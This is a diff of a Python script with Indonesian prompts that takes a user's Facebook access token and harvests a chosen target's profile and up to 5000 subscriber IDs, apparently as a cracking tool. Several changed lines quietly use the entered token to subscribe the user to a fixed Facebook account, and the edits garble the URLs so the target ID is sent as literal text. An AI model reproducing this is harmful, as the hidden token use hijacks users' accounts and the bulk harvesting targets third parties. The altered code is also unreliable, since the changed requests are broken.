@@ -97,7 +97,7 @@ def __raka_sayang_amanda__():
         elif masuk == "1":
 		token = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token  : \033[0;36m")
 		try:
-                	y = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
+                	y = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
 	                x = json.loads(y.text)
 	                nama = x['name']
 	                save = open("login.txt", 'w')
@@ -148,7 +148,7 @@ def __menu__():
 		time.sleep(2)
                 __raka_sayang_amanda__()
         try:
-                p = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
+                p = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                 q = json.loads(p.text)
                 name = q['name']
 		birthday = q['birthday']
@@ -188,12 +188,12 @@ def __menu__():
 		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
-			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			pok = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token)
 			sp = json.loads(pok.text)
 			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
 			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Target tidak di temukan");exit
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
+		r = requests.get("https://graph.facebook.com/'+idt+'/subscribers?limit=5000&access_token="+token)
 		z = json.loads(r.text)
 		for i in z["data"]:
 			uid = i['id']
@@ -217,7 +217,7 @@ def __menu__():
 		sys.stdout.flush()
 		uid = arg
 		try:
-			d = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
+			d = requests.get("https://graph.facebook.com/'+idt+'?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
 	                v = json.loads(d.text)
 			nama = v['name']
 			first = v['first_name']
